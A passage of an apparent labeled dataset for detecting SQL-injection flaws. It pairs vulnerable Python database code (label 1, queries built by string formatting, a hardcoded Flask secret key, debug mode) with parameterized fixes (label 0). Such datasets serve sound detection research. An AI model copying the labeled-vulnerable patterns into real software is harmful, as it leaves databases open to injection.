'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"DELETE FROM Crawls WHERE cid = %s\" % cid)\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 1}, {"id": "5cb70a7a64d77955a702657a27a23cfc845007a6", "code": "crimemap/dbhelper.py/n/nimport pymysql\nimport dbconfig\n\nclass DBHelper:\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection=self.connect()\n        try:\n            # seems the query could only execute one sql a time\n            query=\"INSERT INTO crimes (description) VALUES (%s);\"\n            with connection.cursor() as cursor:\n                cursor.execute(query, data)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection=self.connect()\n        try:\n            query=\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n/n/n/n", "label": 0}, {"id": "5cb70a7a64d77955a702657a27a23cfc845007a6", "code": "/crimemap/dbhelper.py/n/nimport pymysql\nimport dbconfig\n\nclass DBHelper:\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection=self.connect()\n        try:\n            query=\"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection=self.connect()\n        try:\n            query=\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n/n/n/n", "label": 1}, {"id": "dbe43f01fe4b4c170486b723de2ec61736ba02c8", "code": "dbhelper.py/n/nimport pymysql\nimport dbconfig\n\nclass DBHelper:\n\n\tdef connect(self, datbase=\"crimemap\"):\n\t\treturn pymysql.connect(host='localhost',\n\t\t\t\t\t\t\tuser=dbconfig.db_user,\n\t\t\t\t\t\t\tpasswd=dbconfig.db_password,\n\t\t\t\t\t\t\tdb=datbase)\n\n\tdef get_all_inputs(self):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"SELECT description FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\treturn cursor.fetchall()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef add_input(self, data):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"INSERT INTO crimes (description) VALUES (%s);\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query, data)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef clear_all(self):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"DELETE FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n/n/n/n", "label": 0}, {"id": "dbe43f01fe4b4c170486b723de2ec61736ba02c8", "code": "/dbhelper.py/n/nimport pymysql\nimport dbconfig\n\nclass DBHelper:\n\n\tdef connect(self, datbase=\"crimemap\"):\n\t\treturn pymysql.connect(host='localhost',\n\t\t\t\t\t\t\tuser=dbconfig.db_user,\n\t\t\t\t\t\t\tpasswd=dbconfig.db_password,\n\t\t\t\t\t\t\tdb=datbase)\n\n\tdef get_all_inputs(self):\n\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"SELECT description FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\treturn cursor.fetchall()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef add_input(self, data):\n\t\tconnection = self.connect()\n\t\ttry:\n\t\t\tquery = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data) #i didn't understand this '.format(data)'\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n\n\tdef clear_all(self):\n\t\tconnection.connect(self):\n\t\ttry:\n\t\t\tquery = \"DELETE FROM crimes;\"\n\t\t\twith connection.cursor() as cursor:\n\t\t\t\tcursor.execute(query)\n\t\t\t\tconnection.commit()\n\t\tfinally:\n\t\t\tconnection.close()\n/n/n/n", "label": 1}, {"id": "ddd726faa6f19ef93022da0e047beb12d96cc3de", "code": "freepbx_wav_to_mp3_converter.py/n/n#!/usr/bin/python3\n\nimport MySQLdb\nimport subprocess\nimport os.path\nimport sys\n\nfile_format = sys.argv[1]\nrecord_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()\n\nfor wav_file in record_files.splitlines():\n\tname, ext = os.path.splitext(wav_file)\n\tprefer_format_file = \"{}.\".format(name)+file_format\n\tsubprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])\n\tos.remove(wav_file)\n\ntry:\n    conn = MySQLdb.connect(host=\"localhost\", db=\"asteriskcdrdb\")\n    cursor = conn.cursor()\n\nexcept Exception as e:\n    error = True\n\ncursor.execute(\"SELECT uniqueid,recordingfile FROM cdr\")\nresult = cursor.fetchall()\nfor unique_id, record_file in result:\n    name, ext = os.path.splitext(record_file)\n    if ext == \".wav\":\n        print(ext)\n        cursor.execute(\"UPDATE cdr SET recordingfile=CONCAT(%s, '.', %s) WHERE uniqueid=%s\", (name, file_format, unique_id))\n        conn.commit()\n\n/n/n/n", "label": 0}, {"id": "ddd726faa6f19ef93022da0e047beb12d96cc3de", "code": "/freepbx_wav_to_mp3_converter.py/n/n#!/usr/bin/python3\n\nimport MySQLdb\nimport subprocess\nimport os.path\nimport sys\n\nfile_format = sys.argv[1]\nrecord_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()\n\nfor wav_file in record_files.splitlines():\n\tname, ext = os.path.splitext(wav_file)\n\tprefer_format_file = \"{}.\".format(name)+file_format\n\tsubprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])\n\tos.remove(wav_file)\n\ntry:\n    conn = MySQLdb.connect(host=\"localhost\", db=\"asteriskcdrdb\")\n    cursor = conn.cursor()\n\nexcept Exception as e:\n    error = True\n\ncursor.execute(\"SELECT uniqueid,recordingfile FROM cdr\")\nresult = cursor.fetchall()\nfor unique_id, record_file in result:\n    name, ext = os.path.splitext(record_file)\n    if ext == \".wav\":\n        print(ext)\n        cursor.execute(\"UPDATE cdr SET recordingfile='{}.\".format(name) + file_format + \"'\" + \" WHERE uniqueid='{}'\".format(unique_id))\n        conn.commit()\n\n/n/n/n", "label": 1}, {"id": "ffe6ce08e52ff12a05779b98c85ccbf72410eb33", "code": "postgresql_setting.py/n/n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nANSIBLE_METADATA = {'status': ['stableinterface'],\n                    'supported_by': 'community',\n                    'version': '1.0'}\n\n\nDOCUMENTATION = '''\n---\nmodule: postgresql_setting\nshort_description: manage config settings for PostgreSQL instance.\ndescription:\n  - Change server configuration parameters across the entire database cluster\n  - New values will be effective after the next server configuration reload,\n    or after the next server restart in the case of parameters that can only\n    be changed at server start\n  - Only superusers can change configuration settings\nauthor: \"Kostiantyn Nemchenko (@kostiantyn-nemchenko)\"\nversion_added: \"2.3\"\nrequirements:\n  - psycopg2\noptions:\n  login_user:\n    description:\n      - The username used to authenticate with\n    required: false\n    default: null\n  login_password:\n    description:\n      - The password used to authenticate with\n    required: false\n    default: null\n  login_host:\n    description:\n      - Host running the database\n    required: false\n    default: localhost\n  login_unix_socket:\n    description:\n      - Path to a Unix domain socket for local connections\n    required: false\n    default: null\n  port:\n    description:\n      - Database port to connect to.\n    required: false\n    default: 5432\n  option:\n    description:\n      - The parameter from PostgreSQL configuration file\n    required: true\n    default: null\n  value:\n    description:\n      - The value of the parameter to change\n    required: false\n    default: null\n  state:\n    description:\n      - The parameter state\n    required: false\n    default: present\n    choices: [ \"present\", \"absent\" ]\n'''\n\n\nEXAMPLES = '''\n# Set work_mem parameter to 8MB\n- postgresql_setting:\n    guc: work_mem\n    value: 8MB\n    state: present\n\n# Allow only local TCP/IP \"loopback\" connections to be made\n- postgresql_setting:\n    guc: listen_addresses\n    state: absent\n\n# Enable autovacuum\n- postgresql_setting:\n    guc: autovacuum\n    value: on\n'''\nimport traceback\n\ntry:\n    import psycopg2\n    import psycopg2.extras\n    from psycopg2 import sql\nexcept ImportError:\n    postgresqldb_found = False\nelse:\n    postgresqldb_found = True\n\n# import module snippets\nfrom ansible.module_utils.six import iteritems\nfrom ansible.module_utils.basic import AnsibleModule\nfrom ansible.module_utils.database import SQLParseError\nfrom ansible.module_utils._text import to_native\n\n\nclass NotSupportedError(Exception):\n    pass\n\n\n# ===========================================\n# PostgreSQL module specific support methods.\n#\n\ndef is_guc_configurable(cursor, guc):\n    \"\"\"Check if guc is a preset parameter\n    https://www.postgresql.org/docs/current/static/runtime-config-preset.html\n    \"\"\"\n    cursor.execute(\"\"\"\n        SELECT EXISTS\n            (SELECT 1\n             FROM pg_settings\n             WHERE context <> 'internal'\n             AND name = %s);\n        \"\"\",\n        (guc,)\n    )\n    return cursor.fetchone()[0]\n\n\ndef get_default_guc_value(cursor, guc):\n    \"\"\"Get parameter value assumed at server startup\"\"\"\n    cursor.execute(\"\"\"\n        SELECT boot_val\n        FROM pg_settings\n        WHERE name = %s;\n        \"\"\",\n        (guc,)\n    )\n    return cursor.fetchone()[0]\n\n\ndef is_guc_default(cursor, guc):\n    \"\"\"Whether the parameter has not been changed since the last database start or\n    configuration reload\"\"\"\n    cursor.execute(\"\"\"\n        SELECT EXISTS\n            (SELECT 1\n             FROM pg_settings\n             WHERE boot_val = reset_val\n             AND name = %s);\n        \"\"\",\n        (guc,)\n    )\n    return cursor.fetchone()[0]\n\n\ndef guc_exists(cursor, guc):\n    \"\"\"Check if such parameter exists\"\"\"\n    cursor.execute(\"\"\"\n        SELECT name\n        FROM pg_settings\n        WHERE name = %s;\n        \"\"\",\n        (guc,)\n    )\n    return cursor.rowcount > 0\n\n\ndef do_guc_reset(cursor, guc):\n    \"\"\"Reset parameter if it has non-default value\"\"\"\n    if not is_guc_default(cursor, guc):\n        cursor.execute(\n            sql.SQL(\"ALTER SYSTEM RESET {}\").format(sql.Identifier(guc)))\n        return True\n    else:\n        return False\n\n\ndef do_guc_set(cursor, guc, value):\n    \"\"\"Set new value for parameter\"\"\"\n    if not guc_matches(cursor, guc, value):\n        cursor.execute(\n            sql.SQL(\"ALTER SYSTEM SET {} TO %s\").format(sql.Identifier(guc)),  \n            (value,))\n        return True\n    else:\n        return False\n\n\ndef guc_matches(cursor, guc, value):\n    \"\"\"Check if setting matches the specified value\"\"\"\n    cursor.execute(\"SELECT current_setting(%s) = %s\", (guc, value))\n    return cursor.fetchone()[0]\n\n# ===========================================\n# Module execution.\n#\n\n\ndef main():\n    module = AnsibleModule(\n        argument_spec=dict(\n            login_user=dict(default=\"postgres\"),\n            login_password=dict(default=\"\", no_log=True),\n            login_host=dict(default=\"\"),\n            login_unix_socket=dict(default=\"\"),\n            port=dict(default=\"5432\"),\n            guc=dict(required=True,\n                     aliases=[\"name\", \"setting\", \"option\", \"parameter\"]),\n            value=dict(default=\"\"),\n            state=dict(default=\"present\", choices=[\"absent\", \"present\"]),\n        ),\n        supports_check_mode=True\n    )\n\n    if not postgresqldb_found:\n        module.fail_json(msg=\"the python psycopg2 module is required\")\n\n    guc = module.params[\"guc\"]\n    value = module.params[\"value\"]\n    port = module.params[\"port\"]\n    state = module.params[\"state\"]\n    changed = False\n\n    # To use defaults values, keyword arguments must be absent, so\n    # check which values are empty and don't include in the **kw\n    # dictionary\n    params_map = {\n        \"login_host\": \"host\",\n        \"login_user\": \"user\",\n        \"login_password\": \"password\",\n        \"port\": \"port\"\n    }\n    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)\n              if k in params_map and v != '')\n\n    # If a login_unix_socket is specified, incorporate it here.\n    is_localhost = \"host\" not in kw or kw[\"host\"] == \"\" or kw[\"host\"] == \"localhost\"\n    \n    if is_localhost and module.params[\"login_unix_socket\"] != \"\":\n        kw[\"host\"] = module.params[\"login_unix_socket\"]\n\n    try:\n        db_connection = psycopg2.connect(database=\"postgres\", **kw)\n        # Enable autocommit\n        if psycopg2.__version__ >= '2.4.2':\n            db_connection.autocommit = True\n        else:\n            db_connection.set_isolation_level(psycopg2\n                                              .extensions\n                                              .ISOLATION_LEVEL_AUTOCOMMIT)\n        cursor = db_connection.cursor(\n                    cursor_factory=psycopg2.extras.DictCursor)\n    except Exception as e:\n        module.fail_json(msg=\"unable to connect to database: %s\" % to_native(e), \n                         exception=traceback.format_exc())\n\n    try:\n        if is_guc_configurable(cursor, guc):\n            if module.check_mode:\n                if state == \"absent\":\n                    changed = not is_guc_default(cursor, guc)\n                elif state == \"present\":\n                    changed = not guc_matches(cursor, guc, value)\n                module.exit_json(changed=changed, guc=guc)\n\n            if state == \"absent\":\n                try:\n                    changed = do_guc_reset(cursor, guc)\n                except SQLParseError as e:\n                    e = get_exception()\n                    module.fail_json(msg=to_native(e), exception=traceback.format_exc())\n\n            elif state == \"present\":\n                try:\n                    changed = do_guc_set(cursor, guc, value)\n                except SQLParseError as e:\n                    e = get_exception()\n                    module.fail_json(msg=to_native(e), exception=traceback.format_exc())\n        else:\n            module.warn(\"Guc %s does not exist or is preset\" % guc)\n    except NotSupportedError as e:\n        module.fail_json(msg=to_native(e), exception=traceback.format_exc())\n    except SystemExit:\n        # Avoid catching this on Python 2.4\n        raise\n    except Exception as e:\n        module.fail_json(msg=\"Database query failed: %s\" % to_native(e), exception=traceback.format_exc())\n\n    module.exit_json(changed=changed, guc=guc)\n\n\nif __name__ == '__main__':\n    main()\n\n/n/n/n", "label": 0}, {"id": "ffe6ce08e52ff12a05779b98c85ccbf72410eb33", "code": "/postgresql_setting.py/n/n#!/usr/bin/python\r\n# -*- coding: utf-8 -*-\r\n\r\nANSIBLE_METADATA = {'status': ['stableinterface'],\r\n                    'supported_by': 'community',\r\n                    'version': '1.0'}\r\n\r\n\r\nDOCUMENTATION = '''\r\n---\r\nmodule: postgresql_setting\r\nshort_description: manage config settings for PostgreSQL instance.\r\ndescription:\r\n  - Change server configuration parameters across the entire database cluster\r\n  - New values will be effective after the next server configuration reload,\r\n    or after the next server restart in the case of parameters that can only\r\n    be changed at server start\r\n  - Only superusers can change configuration settings\r\nauthor: \"Kostiantyn Nemchenko (@kostiantyn-nemchenko)\"\r\nversion_added: \"2.3\"\r\nrequirements:\r\n  - psycopg2\r\noptions:\r\n  login_user:\r\n    description:\r\n      - The username used to authenticate with\r\n    required: false\r\n    default: null\r\n  login_password:\r\n    description:\r\n      - The password used to authenticate with\r\n    required: false\r\n    default: null\r\n  login_host:\r\n    description:\r\n      - Host running the database\r\n    required: false\r\n    default: localhost\r\n  login_unix_socket:\r\n    description:\r\n      - Path to a Unix domain socket for local connections\r\n    required: false\r\n    default: null\r\n  port:\r\n    description:\r\n      - Database port to connect to.\r\n    required: false\r\n    default: 5432\r\n  option:\r\n    description:\r\n      - The parameter from PostgreSQL configuration file\r\n    required: true\r\n    default: null\r\n  value:\r\n    description:\r\n      - The value of the parameter to change\r\n    required: false\r\n    default: null\r\n  state:\r\n    description:\r\n      - The parameter state\r\n    required: false\r\n    default: present\r\n    choices: [ \"present\", \"absent\" ]\r\n'''\r\n\r\n\r\nEXAMPLES = '''\r\n# Set work_mem parameter to 8MB\r\n- postgresql_setting:\r\n    option: work_mem\r\n    value: 8MB\r\n    state: present\r\n\r\n# Allow only local TCP/IP \"loopback\" connections to be made\r\n- postgresql_setting:\r\n    option: listen_addresses\r\n    state: absent\r\n\r\n# Enable autovacuum\r\n- postgresql_setting:\r\n    option: autovacuum\r\n    value: on\r\n'''\r\n\r\n\r\ntry:\r\n    import psycopg2\r\n    import psycopg2.extras\r\nexcept ImportError:\r\n    postgresqldb_found = False\r\nelse:\r\n    postgresqldb_found = True\r\nfrom ansible.module_utils.six import iteritems\r\n\r\n\r\nclass NotSupportedError(Exception):\r\n    pass\r\n\r\n\r\n# ===========================================\r\n# PostgreSQL module specific support methods.\r\n#\r\n\r\ndef option_ispreset(cursor, option):\r\n    \"\"\"Check if option is a preset parameter\r\n    https://www.postgresql.org/docs/current/static/runtime-config-preset.html\r\n    \"\"\"\r\n    query = \"\"\"\r\n    SELECT EXISTS\r\n        (SELECT 1\r\n         FROM pg_settings\r\n         WHERE context = 'internal'\r\n           AND name = '%s')\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.fetchone()[0]\r\n\r\n\r\ndef option_get_default_value(cursor, option):\r\n    \"\"\"Get parameter value assumed at server startup\"\"\"\r\n    query = \"\"\"\r\n    SELECT boot_val\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.fetchone()[0]\r\n\r\n\r\ndef option_isdefault(cursor, option):\r\n    \"\"\"Whether the parameter has not been changed since the last database start or\r\n    configuration reload\"\"\"\r\n    query = \"\"\"\r\n    SELECT boot_val,\r\n           reset_val\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    rows = cursor.fetchone()\r\n    if cursor.rowcount > 0:\r\n        default_value, current_value = rows[0], rows[1]\r\n        return default_value == current_value\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_exists(cursor, option):\r\n    \"\"\"Check if such parameter exists\"\"\"\r\n    query = \"\"\"\r\n    SELECT name\r\n    FROM pg_settings\r\n    WHERE name = '%s'\r\n    \"\"\"\r\n    cursor.execute(query % option)\r\n    return cursor.rowcount > 0\r\n\r\n\r\ndef option_reset(cursor, option):\r\n    \"\"\"Reset parameter if it has non-default value\"\"\"\r\n    if not option_isdefault(cursor, option):\r\n        query = \"ALTER SYSTEM SET %s TO '%s'\"\r\n        cursor.execute(query % (option,\r\n                                option_get_default_value(cursor, option)))\r\n        return True\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_set(cursor, option, value):\r\n    \"\"\"Set new value for parameter\"\"\"\r\n    if not option_matches(cursor, option, value):\r\n        query = \"ALTER SYSTEM SET %s TO '%s'\"\r\n        cursor.execute(query % (option, value))\r\n        return True\r\n    else:\r\n        return False\r\n\r\n\r\ndef option_matches(cursor, option, value):\r\n    \"\"\"Check if setting matches the specified value\"\"\"\r\n    query = \"SELECT current_setting('%s') = '%s'\"\r\n    cursor.execute(query % (option, value))\r\n    return cursor.fetchone()[0]\r\n\r\n\r\n# ===========================================\r\n# Module execution.\r\n#\r\n\r\n\r\ndef main():\r\n    module = AnsibleModule(\r\n        argument_spec=dict(\r\n            login_user=dict(default=\"postgres\"),\r\n            login_password=dict(default=\"\", no_log=True),\r\n            login_host=dict(default=\"\"),\r\n            login_unix_socket=dict(default=\"\"),\r\n            port=dict(default=\"5432\"),\r\n            option=dict(required=True,\r\n                        aliases=['name', 'setting', 'guc', 'parameter']),\r\n            value=dict(default=\"\"),\r\n            state=dict(default=\"present\", choices=[\"absent\", \"present\"]),\r\n        ),\r\n        supports_check_mode=True\r\n    )\r\n\r\n    if not postgresqldb_found:\r\n        module.fail_json(msg=\"the python psycopg2 module is required\")\r\n\r\n    option = module.params[\"option\"]\r\n    value = module.params[\"value\"]\r\n    port = module.params[\"port\"]\r\n    state = module.params[\"state\"]\r\n    changed = False\r\n\r\n    # To use defaults values, keyword arguments must be absent, so\r\n    # check which values are empty and don't include in the **kw\r\n    # dictionary\r\n    params_map = {\r\n        \"login_host\": \"host\",\r\n        \"login_user\": \"user\",\r\n        \"login_password\": \"password\",\r\n        \"port\": \"port\"\r\n    }\r\n    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)\r\n              if k in params_map and v != '')\r\n\r\n    # If a login_unix_socket is specified, incorporate it here.\r\n    if \"host\" not in kw or kw[\"host\"] == \"\" or kw[\"host\"] == \"localhost\":\r\n        is_localhost = True\r\n    else:\r\n        is_localhost = False\r\n\r\n    if is_localhost and module.params[\"login_unix_socket\"] != \"\":\r\n        kw[\"host\"] = module.params[\"login_unix_socket\"]\r\n\r\n    try:\r\n        db_connection = psycopg2.connect(database=\"postgres\", **kw)\r\n        # Enable autocommit\r\n        if psycopg2.__version__ >= '2.4.2':\r\n            db_connection.autocommit = True\r\n        else:\r\n            db_connection.set_isolation_level(psycopg2\r\n                                              .extensions\r\n                                              .ISOLATION_LEVEL_AUTOCOMMIT)\r\n        cursor = db_connection.cursor(\r\n            cursor_factory=psycopg2.extras.DictCursor)\r\n    except Exception:\r\n        e = get_exception()\r\n        module.fail_json(msg=\"unable to connect to database: %s\" % e)\r\n\r\n    try:\r\n        if option_ispreset(cursor, option):\r\n            module.warn(\r\n                \"Option %s is preset, so it can only be set at initdb \"\r\n                \"or before building from source code. For details, see \"\r\n                \"postgresql.org/docs/current/static/runtime-config-preset.html\"\r\n                % option\r\n            )\r\n        elif option_exists(cursor, option):\r\n            if module.check_mode:\r\n                if state == \"absent\":\r\n                    changed = not option_isdefault(cursor, option)\r\n                elif state == \"present\":\r\n                    changed = not option_matches(cursor, option, value)\r\n                module.exit_json(changed=changed, option=option)\r\n\r\n            if state == \"absent\":\r\n                try:\r\n                    changed = option_reset(cursor, option)\r\n                except SQLParseError:\r\n                    e = get_exception()\r\n                    module.fail_json(msg=str(e))\r\n\r\n            elif state == \"present\":\r\n                try:\r\n                    changed = option_set(cursor, option, value)\r\n                except SQLParseError:\r\n                    e = get_exception()\r\n                    module.fail_json(msg=str(e))\r\n        else:\r\n            module.warn(\"Option %s does not exist\" % option)\r\n    except NotSupportedError:\r\n        e = get_exception()\r\n        module.fail_json(msg=str(e))\r\n    except SystemExit:\r\n        # Avoid catching this on Python 2.4\r\n        raise\r\n    except Exception:\r\n        e = get_exception()\r\n        module.fail_json(msg=\"Database query failed: %s\" % e)\r\n\r\n    module.exit_json(changed=changed, option=option)\r\n\r\n# import module snippets\r\nfrom ansible.module_utils.basic import *\r\nfrom ansible.module_utils.database import *\r\nif __name__ == '__main__':\r\n    main()\r\n/n/n/n", "label": 1}, {"id": "069700fb4beec79182fff3c556e9cccce3230d6f", "code": "forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\nimport datetime\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"select content, time from posts order by time desc\")\n  all_posts = cursor.fetchall()\n  conn.close()\n  return all_posts\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  one_post = content\n  cursor.execute(\"insert into posts values (%s)\", (one_post,))\n  conn.commit()\n  conn.close()\n/n/n/n", "label": 0}, {"id": "069700fb4beec79182fff3c556e9cccce3230d6f", "code": "/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\nimport datetime\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"select content, time from posts order by time desc\")\n  all_posts = cursor.fetchall()\n  conn.close()\n  return all_posts\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  conn = psycopg2.connect(\"dbname=forum\")\n  cursor = conn.cursor()\n  cursor.execute(\"insert into posts values ('%s')\" % content)\n  conn.commit()\n  conn.close()\n/n/n/n", "label": 1}, {"id": "09109f0bedf10b0a54e5a211c54e039ed049e443", "code": "nrf24/nrf24.py/n/n#!/usr/bin/env python\n\n'''\n\tThis code includes usage of nRF24L01 on Arduino Uno.\n\tConnection table = http://tmrh20.github.io/RF24/\n\n\t@author \u00c7a\u011fatay Tany\u0131ld\u0131z\n\t@email  cagataytanyildiz[at]protonmail[dot]com\n'''\nimport time\nfrom datetime import datetime\nimport sys\nfrom struct import unpack\nfrom RF24 import RF24\nimport psycopg2\n\nirq_gpio_pin = None\ncon = None\n\nradio = RF24(22, 0)\n\n#EXAMPLE_TIMESTAMPT=strftime(\"%Y-%m-%d %H:%M:%S\", gmtime())\n#EXAMPLE_LOG=\"\"\"INSERT INTO LOGS\n#(HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\n#VALUES(\"\"\"+str(values[1])+\"','\"+str(values[2])+\"','\"+str(values[3])+\"','\"+values[4]+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"\"\"',1)\n#\"\"\"\n\ndef get_data_from_node():\n\tif radio.available():\n\t\twhile radio.available():\n\t\t\tlength = 10\n\t\t\treceive_payload = radio.read(length)\n\t\t\tvalues = unpack('hhhhh',receive_payload)\n\t\t\tprint \"Node Number: \"+str(values[0])+\"\\nLight: \"+str(values[1])+\" Humidity: \"+str(values[2])+\" Temperature: \"+str(values[3])+\" MQ6: \"+str(values[4])\n\t\t\t#TIMESTAMPT = \"(%s)\",(datetime.now(),)\n\t\t\t#LOG=\"INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\tVALUES(\"+str(values[1])+\",\"+str(values[2])+\",\"+str(values[3])+\",\"+str(values[4])+\",('%s'),('%s'),1);\" % (datetime.now(),datetime.now(),)\n\t\t\tlog=\"INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID) VALUES (%s, %s, %s, %s, %s, %s, %s);\"\n\t\t\tvals = values[:4] + [datetime.now(),datetime.now(), 1]\n\t\t\twrite_to_db(log, vals)\n\t\t\t#write_to_db(LOG)\n\ndef write_to_db(log, vals):\n\ttry:\n\t\tcon = psycopg2.connect(database='dname', user='uname', password='pass')\n\t\tcon.cursor().execute(log, vals)\n\t\tcon.commit()\n\texcept psycopg2.DatabaseError, e:\n\t\tprint 'Error %s' % e\n\t\tsys.exit(1)\n\npipes = [\"0Node\", \"1Node\"]\nradio.begin()\nradio.setRetries(15,15)\nradio.printDetails()\n\nradio.openWritingPipe(pipes[1])\nradio.openReadingPipe(1,pipes[0])\nradio.startListening()\n\nwhile 1:\n\tget_data_from_node()\n\ttime.sleep(0.1)\n/n/n/n", "label": 0}, {"id": "09109f0bedf10b0a54e5a211c54e039ed049e443", "code": "/nrf24/nrf24.py/n/n#!/usr/bin/env python\n\n'''\n\tThis code includes usage of nRF24L01 on Arduino Uno.\n\tConnection table = http://tmrh20.github.io/RF24/\n\n\t@author \u00c7a\u011fatay Tany\u0131ld\u0131z\n\t@email  cagataytanyildiz[at]protonmail[dot]com\n'''\nimport time\nfrom datetime import datetime\nimport sys\nfrom struct import unpack\nfrom RF24 import RF24\nimport psycopg2\n\nirq_gpio_pin = None\ncon = None\n\nradio = RF24(22, 0)\n\n#EXAMPLE_TIMESTAMPT=strftime(\"%Y-%m-%d %H:%M:%S\", gmtime())\n#EXAMPLE_LOG=\"\"\"INSERT INTO LOGS\n#(HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\n#VALUES(\"\"\"+str(values[1])+\"','\"+str(values[2])+\"','\"+str(values[3])+\"','\"+values[4]+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"','\"+str(EXAMPLE_TIMESTAMPT)+\"\"\"',1)\n#\"\"\"\n\ndef get_data_from_node():\n\tif 